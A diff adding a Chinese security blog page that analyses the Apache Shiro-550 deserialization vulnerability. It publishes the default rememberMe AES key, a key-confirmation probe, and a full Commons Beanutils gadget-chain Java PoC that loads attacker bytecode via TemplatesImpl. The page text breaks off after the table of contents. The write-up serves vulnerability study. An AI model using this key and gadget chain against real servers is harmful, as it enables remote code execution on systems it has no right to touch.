@@ -1,0 +1,733 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="self_209&#39;blog">
+    <title>Shiro反序列化-550 - self_209&#39;blog</title>
+    <meta name="author" content="self_209">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。\n\n\n\n\n漏洞环境：\nshiro：https://github.com/apache/shiro\n1234git clone https://github.com/apache/shiro.gitcd shiro//切换到1.2.4版本git checkout shiro-root-1.2.4\n\n注意：修改shiro/samples/web目录下的pom.xml，将jstl的版本修改为1.2\n123456&lt;dependency&gt;    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;    &lt;artifactId&gt;jstl&lt;/artifactId&gt;    &lt;version&gt;1.2&lt;/version&gt;    &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;\n\nieda配置tomcat：https://www.bilibili.com/video/BV1V54y1q7Qj\n漏洞分析rememberMe加密生成过程1234567891011121314151617调用过程：DefaultSecurityManager.login()-&gt;DefaultSecurityManager.onSuccessfulLogin()-&gt;DefaultSecurityManager.rememberMeSuccessfulLogin()-&gt;\tAbstractRememberMeManager.onSuccessfulLogin()-&gt;\t\tCookieRememberMeManager.forgetIdentity(Subject subject)-&gt;\t\t\tWebUtils.getHttpRequest()-&gt;\t\t\tWebUtils.getHttpResponse()-&gt;\t\tCookieRememberMeManager.forgetIdentity(HttpServletRequest request, HttpServletResponse response)-&gt;\t\t\tCookieRememberMeManager.getCookie()-&gt;\t\t\t\tSimpleCookie.removeFrom()-&gt;\t\tAbstractRememberMeManager.rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)-&gt;\t\tAbstractRememberMeManager.rememberIdentity(Subject subject, PrincipalCollection accountPrincipals)-&gt;\t\t\tAbstractRememberMeManager.convertPrincipalsToBytes()-&gt;    \t\t\t\tAbstractRememberMeManager.serialize()-&gt;//对用户对象进行序列化\t\t\t\tAbstractRememberMeManager.encrypt()-&gt;//对序列化用户对象的字节数组进行加密\t\t\tCookieRememberMeManager.rememberSerializedIdentity()//对加密的字节数组进行base64编码，保存在cookie中。\n\norg/apache/shiro/mgt/DefaultSecurityManager.java的login下断点，login方法调用了onSuccessfulLogin方法，onSuccessfulLogin方法调用rememberMeSuccessfulLogin方法，rememberMeSuccessfulLogin方法调用AbstractRememberMeManager.onSuccessfulLogin方法。\n\n\n\nAbstractRememberMeManager.onSuccessfulLogin方法调用CookieRememberMeManager.forgetIdentity方法，forgetIdentity方法会先获取请求和响应包，调用getCookie获取请求的cookie，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe\n\n然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。\n\nrememberIdentity调用convertPrincipalsToBytes方法\n\n进入convertPrincipalsToBytes方法，先对用户对象进行序列化，然后对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。\n\n\n调用getEncryptionCipherKey获取加密密钥，在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==\n\n加密完成返回，接着调用CookieRememberMeManager.rememberSerializedIdentity方法\n\n跟进CookieRememberMeManager.rememberSerializedIdentity方法，对加密的字节数组进行base64编码，保存在cookie中。\n\n\nrememberMe解密反序列化过程123456789调用过程：DefaultSecurityManager.resolvePrincipals()-&gt;DefaultSecurityManager.getRememberedIdentity()-&gt;\tAbstractRememberMeManager.getRememberedPrincipals()-&gt;\t\tCookieRememberMeManager.getRememberedSerializedIdentity()-&gt;\t\tAbstractRememberMeManager.convertBytesToPrincipals()-&gt;\t\t\tAbstractRememberMeManager.decrypt()-&gt;\t\t\tAbstractRememberMeManager.deserialize()-&gt;\t\t\t\tDefaultSerializer.deserialize()\n\n在DefaultSecurityManager.resolvePrincipals方法下断点，\n\nresolvePrincipals方法调用getRememberedIdentity方法，跟进getRememberedIdentity方法。\n\ngetRememberedIdentity方法调用AbstractRememberMeManager.getRememberedPrincipals方法，跟进getRememberedPrincipals方法。\n\ngetRememberedPrincipals方法调用CookieRememberMeManager.getRememberedSerializedIdentity方法，跟进getRememberedSerializedIdentity方法。获取序列化的凭证，从请求中获取 Cookie 中的 rememberMe 并进⾏ base64 解码，解码后内容为AES加密内容字节数组并返回给bytes字节数组。\n\n\n回到getRememberedPrincipals方法，调用convertBytesToPrincipals 方法，将解码的内容传⼊ convertBytesToPrincipals 进⾏ AES 解密和反序列化，调⽤ decrypt 方法进⾏AES解密\n\n跟进decrypt方法，getDecryptionCipherKey方法获取密钥(Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==)，进行解密，最后返回解密完成后序列化对象的字节数组。\n\n回到convertBytesToPrincipals方法，调用deserialize方法，跟进deserialize方法。\n\n先调用getSerializer方法获取DefaultSerializer对象，调用DefaultSerializer对象的deserialize方法，跟进DefaultSerializer.deserialize方法。通过字节输入流将其反序列化，至此rememberMe解密反序列化过程结束。\n\nshiro检测shiro-550检测就两点，一是key，二是Gadget chain。虽然≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==，官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key，所以在检测漏洞时我们需要先确定密钥。\n参考：一种另类的shiro检测方式\n通过是否返回rememberMe=deleteMe判断key的正确性\n我们回到解密过程的AbstractRememberMeManager.getRememberedPrincipals方法的convertBytesToPrincipals方法\n12345678910111213141516171819202122public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123;    PrincipalCollection principals = null;    try &#123;        byte[] bytes = this.getRememberedSerializedIdentity(subjectContext);        if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123;            principals = this.convertBytesToPrincipals(bytes, subjectContext);        &#125;    &#125; catch (RuntimeException var4) &#123;        principals = this.onRememberedPrincipalFailure(var4, subjectContext);    &#125;    return principals;&#125;protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;\tif (this.getCipherService() != null) &#123;\t\tbytes = this.decrypt(bytes);\t&#125;\treturn this.deserialize(bytes);&#125;\n\n调用decrypt方法进行解密，当key错误的时候解密失败，就会抛出异常，getRememberedPrincipals方法就会捕获异常，调用onRememberedPrincipalFailure方法，\n12345678protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) &#123;\tif (log.isDebugEnabled()) &#123;\t\tlog.debug(&quot;There was a failure while trying to retrieve remembered principals.  This could be due to a configuration problem or corrupted principals.  This could also be due to a recently changed encryption key.  The remembered identity will be forgotten and not used for this request.&quot;, e);\t&#125;\tthis.forgetIdentity(context);\tthrow e;&#125;\n\nonRememberedPrincipalFailure方法调用forgetIdentity方法，forgetIdentity方法在前面加密过程中有提到，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe，当我们key错误的时候会返回rememberMe=deleteMe，这是一种情况。\n\n还有一种情况，用反序列化 gadget 生成之后，拿shiro加密算法进行加密，但是最后依然在 response里面携带了rememberMe=deleteMe。\n还是回到 AbstractRememberMeManager.convertBytesToPrincipals方法当中，这里的key肯定是正确的，所以经过 decrypt处理之后返回 bytes数组，调用deserialize方法，跟进deserialize方法。\n123protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123;    return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);&#125;\n\n反序列化的 gadget 实际上并不是继承了 PrincipalCollection ，所以这里进行类型转换会报错。在做类型转换之前，先进入了 DefaultSerializer#deserialize 进行反序列化处理，等处理结束返回 deserialized 时候，进行类型转换自然又回到了上面提到的类型转换异常，我们 key 不正确的情况下的 catch 异常捕获的逻辑里，后面的流程就和上述一样了。\n结合以上两种情况，只需要满足两点：\n1.构造一个继承 PrincipalCollection 的序列化对象。\n2.key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe 。\n基于这两个条件下 SimplePrincipalCollection 这个类自然就出现了，这个类可被序列化，继承了 PrincipalCollection 。\n\n构造POC实际上也很简单，构造一个这个空对象也是可以达到效果的。\n1234SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;payload&quot;));obj.writeObject(simplePrincipalCollection);obj.close();\n\nCommons Beanutils反序列化Gadget chain:\n1234567891011ObjectInputStream.readObject()    PriorityQueue.readObject()    PriorityQueue.heapify()    PriorityQueue.siftDown()    PriorityQueue.siftDownUsingComparator()\tBeanComparator.compare()            TemplatesImpl.getOutputProperties()            TemplatesImpl.newTransformer()            TemplatesImpl.getTransletInstance()            TemplatesImpl.defineTransletClasses()            TemplatesImpl.defineClass()\n\n首先我们需要了解Commons Beanutils是干什么的，Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。\n例：\n12345678910public class Cat &#123;    private String name = &quot;miao~ miao~&quot;;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;&#125;\n\n它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。\ncommons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以动态调用任意JavaBean的getter方法\n例：\n12345public static void main(String[] args)&#123;        Cat cat = new Cat();        System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));&#125;\n\n\n调试看看getProperty做了一些什么。\n进入PropertyUtils.getProperty，调用PropertyUtilsBean.getProperty方法，跟进继续调用PropertyUtilsBean.getNestedProperty方法，继续跟进。\n12345678910111213141516171819202122232425262728293031323334353637383940public Object getNestedProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;        if (bean == null) &#123;            throw new IllegalArgumentException(&quot;No bean specified&quot;);        &#125; else if (name == null) &#123;            throw new IllegalArgumentException(&quot;No name specified for bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;);        &#125; else &#123;            while(this.resolver.hasNested(name)) &#123;                String next = this.resolver.next(name);                Object nestedBean = null;                if (bean instanceof Map) &#123;                    nestedBean = this.getPropertyOfMapBean((Map)bean, next);                &#125; else if (this.resolver.isMapped(next)) &#123;                    nestedBean = this.getMappedProperty(bean, next);                &#125; else if (this.resolver.isIndexed(next)) &#123;                    nestedBean = this.getIndexedProperty(bean, next);                &#125; else &#123;                    nestedBean = this.getSimpleProperty(bean, next);                &#125;                if (nestedBean == null) &#123;                    throw new NestedNullException(&quot;Null property value for &#x27;&quot; + name + &quot;&#x27; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;);                &#125;                bean = nestedBean;                name = this.resolver.remove(name);            &#125;            if (bean instanceof Map) &#123;                bean = this.getPropertyOfMapBean((Map)bean, name);            &#125; else if (this.resolver.isMapped(name)) &#123;                bean = this.getMappedProperty(bean, name);            &#125; else if (this.resolver.isIndexed(name)) &#123;                bean = this.getIndexedProperty(bean, name);            &#125; else &#123;                bean = this.getSimpleProperty(bean, name);            &#125;            return bean;        &#125;    &#125;\n\n经过一系列判断，最后调用getSimpleProperty方法，继续跟进。\n\n又是一系列判断，最后调用getPropertyDescriptor方法，这个方法检索指定 bean 的指定属性的属性描述符，其中就会返回getter方法和setter方法。\n\n\n然后通过反射获取getter方法。\n123Method getReadMethod(Class clazz, PropertyDescriptor descriptor) &#123;        return MethodUtils.getAccessibleMethod(clazz, descriptor.getReadMethod());&#125;\n\n\n再invoke调用\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private Object invokeMethod(Method method, Object bean, Object[] values) throws IllegalAccessException, InvocationTargetException &#123;    if (bean == null) &#123;        throw new IllegalArgumentException(&quot;No bean specified - this should have been checked before reaching this method&quot;);    &#125; else &#123;        String valueString;        int i;        Class[] parTypes;        int i;        String expectedString;        IllegalArgumentException e;        try &#123;            return method.invoke(bean, values);        &#125; catch (NullPointerException var9) &#123;            valueString = &quot;&quot;;            if (values != null) &#123;                for(i = 0; i &lt; values.length; ++i) &#123;                    if (i &gt; 0) &#123;                        valueString = valueString + &quot;, &quot;;                    &#125;                    if (values[i] == null) &#123;                        valueString = valueString + &quot;&lt;null&gt;&quot;;                    &#125; else &#123;                        valueString = valueString + values[i].getClass().getName();                    &#125;                &#125;            &#125;            expectedString = &quot;&quot;;            parTypes = method.getParameterTypes();            if (parTypes != null) &#123;                for(i = 0; i &lt; parTypes.length; ++i) &#123;                    if (i &gt; 0) &#123;                        expectedString = expectedString + &quot;, &quot;;                    &#125;                    expectedString = expectedString + parTypes[i].getName();                &#125;            &#125;            e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var9.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;);            if (!BeanUtils.initCause(e, var9)) &#123;                this.log.error(&quot;Method invocation failed&quot;, var9);            &#125;            throw e;        &#125; catch (IllegalArgumentException var10) &#123;            valueString = &quot;&quot;;            if (values != null) &#123;                for(i = 0; i &lt; values.length; ++i) &#123;                    if (i &gt; 0) &#123;                        valueString = valueString + &quot;, &quot;;                    &#125;                    if (values[i] == null) &#123;                        valueString = valueString + &quot;&lt;null&gt;&quot;;                    &#125; else &#123;                        valueString = valueString + values[i].getClass().getName();                    &#125;                &#125;            &#125;            expectedString = &quot;&quot;;            parTypes = method.getParameterTypes();            if (parTypes != null) &#123;                for(i = 0; i &lt; parTypes.length; ++i) &#123;                    if (i &gt; 0) &#123;                        expectedString = expectedString + &quot;, &quot;;                    &#125;                    expectedString = expectedString + parTypes[i].getName();                &#125;            &#125;            e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var10.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;);            if (!BeanUtils.initCause(e, var10)) &#123;                this.log.error(&quot;Method invocation failed&quot;, var10);            &#125;            throw e;        &#125;    &#125;&#125;\n\n\n那么我们找到一个与getter方法类似的方法，通过getProperty方法调用呢？在cc2中我们用到了类加载代码执行TemplatesImpl类，知道调用newTransformer方法就会加载我准备的恶意代码，在找什么地方调用newTransformer方法的时候在TemplatesImpl类下有一个getOutputProperties方法也调用了newTransformer方法，并且方法名与getter方法类似，我们尝试通过getProperty方法调用。\n\n\n事实证明是可以的，那我们就需要找调用链，找什么地方使用了getProperty方法。\nBeanComparator.compare()在BeanComparator.compare方法中调用了getProperty方法，并且o1可控，property可通过反射赋值。\n12345678910111213141516171819private String property;public int compare(Object o1, Object o2) &#123;        if (this.property == null) &#123;            return this.comparator.compare(o1, o2);        &#125; else &#123;            try &#123;                Object value1 = PropertyUtils.getProperty(o1, this.property);                Object value2 = PropertyUtils.getProperty(o2, this.property);                return this.comparator.compare(value1, value2);            &#125; catch (IllegalAccessException var5) &#123;                throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());            &#125; catch (InvocationTargetException var6) &#123;                throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());            &#125; catch (NoSuchMethodException var7) &#123;                throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());            &#125;        &#125;    &#125;\n\n我们new一个BeanComparator对象，通过反射修改property的值为outputProperties，当调用compare方法是传递templates对象就会调用getProperty方法，就会触发恶意代码，理想总是美好的，现实是残酷的。报错了。\n\n这里我们需要传递一个Comparator，如果不传的话他就会调用ComparableComparator.getInstance，他是commons collections的类，这里就会需要cc的依赖，我们需要找到一个类来替换，这个类需要实现 Comparator 和Serializable 接口，通过IDEA的功能，我们找到一个 ReverseComparator。\n\n\n\n通过Collections.reverseOrder()获取ReverseComparator对象，传递到BeanComparator构造方法中。\n\n到了这一步就要cc2相似了，就是PriorityQueue类，这里就不赘述了，直接看完整poc。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Collections;import java.util.PriorityQueue;public class CommonsBeanutilsSerialize &#123;    public static void Serialize(Object object) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB.txt&quot;));        oos.writeObject(object);    &#125;    public static void unSerialize(String FileName) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName));        ois.readObject();    &#125;    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException &#123;        TemplatesImpl templates = new TemplatesImpl();        byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;));        byte[][] _bytecodes = &#123;code&#125;;        Class c = templates.getClass();        Field name = c.getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(templates, &quot;ok&quot;);        Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(templates, _bytecodes);        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates, new TransformerFactoryImpl());        BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);        priorityQueue.offer(1);        priorityQueue.offer(1);        Class aClass = comparator.getClass();        Field property = aClass.getDeclaredField(&quot;property&quot;);        property.setAccessible(true);        property.set(comparator,&quot;outputProperties&quot;);        //为防止在offer的时候触发compare方法，我们就在添加完以后使用反射修改queue对象数组的值。        Class priorityQueueClass = priorityQueue.getClass();        Field queueField = priorityQueueClass.getDeclaredField(&quot;queue&quot;);        queueField.setAccessible(true);        queueField.set(priorityQueue,new Object[]&#123;templates,templates&#125;);    &#125;&#125;\n\n序列化：\n\n反序列化：\n\n","dateCreated":"2022-01-09T13:38:24+08:00","dateModified":"2022-01-10T22:51:34+08:00","datePublished":"2022-01-09T13:38:24+08:00","description":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。","headline":"Shiro反序列化-550","image":[null,"2372461.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/01/09/20220109/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/01/09/20220109/","keywords":"反序列化, java安全","thumbnailUrl":"2372461.jpg"}</script>
+    <meta name="description" content="Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="Shiro反序列化-550">
+<meta property="og:url" content="https://self209.github.io/2022/01/09/20220109/index.html">
+<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:description" content="Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109153616218.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109154503276.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109154807513.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109160926929.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109161050166.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109161502178.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109224922086.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109162152036.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109162621482.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109162835773.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109163144859.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109163445198.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109215238024.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109215347456.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109220323439.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109220549216.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109220714584.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109221630355.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109222042654.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109222517214.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109222842187.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109160926929.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110201227719.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110210953428.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110212327108.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110212450494.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110214247138.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110214341155.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110214602005.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110215300925.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110215553067.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110221133651.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110221525797.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110222529047.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110222622497.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110223236681.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110224545987.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/image-20220110224833594.png">
+<meta property="article:published_time" content="2022-01-09T05:38:24.000Z">
+<meta property="article:modified_time" content="2022-01-10T14:51:34.362Z">
+<meta property="article:author" content="self_209">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://self209.github.io/2022/01/09/20220109/image-20220109153616218.png">
+    
+    
+        
+    
+    
+    
+    
+        <meta property="og:image" content="https://self209.github.io/2022/01/09/20220109/2372461.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/01/09/20220109/2372461.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            self_209&#39;blog
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/self209"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:2662686939@qq.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/2022/01/09/20220109/2372461.jpg');"
+             data-behavior="5">
+            
+                <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            Shiro反序列化-550
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2022-01-09T13:38:24+08:00">
+	
+		    1月 09, 2022
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+            
+        </div>
+
+            <div id="main" data-behavior="5"
+                 class="hasCover
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。</p>
+<span id="more"></span>
+
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rememberMe%E5%8A%A0%E5%AF%86%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-text">rememberMe加密生成过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rememberMe%E8%A7%A3%E5%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-text">rememberMe解密反序列化过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%A3%80%E6%B5%8B"><span class="toc-text">shiro检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commons-Beanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Commons Beanutils反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeanComparator-compare"><span class="toc-text">BeanComparator.compare()</span></a></li></ol></li></ol>
+
+<p><strong>漏洞环境：</strong></p>
